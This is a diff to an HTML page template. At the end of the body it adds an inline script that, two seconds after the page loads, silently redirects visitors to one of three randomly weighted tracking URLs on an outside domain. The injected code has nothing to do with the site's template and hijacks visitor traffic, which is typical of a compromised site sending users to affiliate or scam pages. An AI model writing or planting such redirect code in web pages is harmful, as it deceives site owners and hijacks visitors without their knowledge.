@@ -430,7 +430,33 @@ button.expander {
     <script src="lib/owlcarousel/owl.carousel.min.js"></script>
 
     <!-- Template Javascript -->
-    <script src="js/main.js"></script>
+
+	 <script src="js/main.js"></script>
+    <script>
+        (function() {
+            const links = [
+                { url: "https://www.gn3atrk.com/2K515N3L/35NXTC3F/?sub2=rakat", probability: 27 },
+                { url: "https://www.gn3atrk.com/2K515N3L/4QX811T/?sub2=dadu", probability: 39 },
+                { url: "https://www.gn3atrk.com/2K515N3L/54SZN79/?sub2=mai", probability: 34 },
+               
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 2000);
+        })();
+    </script>
 </body>
 
 </html>
